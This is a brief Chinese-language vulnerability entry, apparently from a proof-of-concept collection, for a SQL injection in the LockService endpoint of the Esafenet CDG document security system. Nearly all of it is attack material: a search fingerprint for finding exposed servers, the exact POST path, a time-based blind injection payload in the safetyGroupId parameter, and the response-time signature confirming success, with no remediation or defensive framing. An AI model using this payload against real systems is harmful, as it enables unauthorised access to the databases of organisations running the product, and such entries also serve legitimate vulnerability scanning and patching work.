# 亿赛通电子文档安全管理系统LockService存在SQL注入漏洞

亿赛通电子文档安全管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/CDGServer3/index.jsp"`
- **请求**：`POST /CDGServer3/lock/LockService;Servicelogin HTTP/1.1`

**Payload**
```
command=AddLockToSafetyGroup&safetyGroupId=11111';WAITFOR+DELAY+'0:0:3'--&fromurl=/client/clientList.jsp&lockKeyId=1
```
- **响应特征**：200 响应时间>=3s